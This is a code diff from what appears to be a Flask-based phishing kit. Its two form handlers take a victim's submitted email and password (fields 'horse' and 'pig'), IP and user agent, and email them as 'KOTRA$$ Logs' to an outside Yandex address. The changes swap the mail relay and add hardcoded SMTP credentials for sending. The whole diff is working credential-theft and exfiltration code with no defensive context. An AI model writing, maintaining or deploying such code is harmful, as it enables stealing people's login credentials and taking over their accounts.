@@ -191,10 +191,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "no-reply@omanandemirates.org"
+        sender_email = "logger@guide-level.com"
         sender_emaill = "no-reply"
         receiver_email = "yamaha19454x2@yandex.com"
-        password = "vip5310abccd3e7"
+        password = "Os2]wrRVl5=t"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs "
@@ -210,8 +210,8 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("62.106.66.149", 2525) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
         session['eman'] = email  # Save email as session variable
@@ -231,10 +231,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "no-reply@omanandemirates.org"
+        sender_email = "logger@guide-level.com"
         sender_emaill = "no-reply"
         receiver_email = "yamaha19454x2@yandex.com"
-        password = "vip5310abccd3e7"
+        password = "Os2]wrRVl5=t"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
@@ -250,8 +250,8 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("62.106.66.149", 2525) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
         return redirect(url_for('lasmo', web=email))
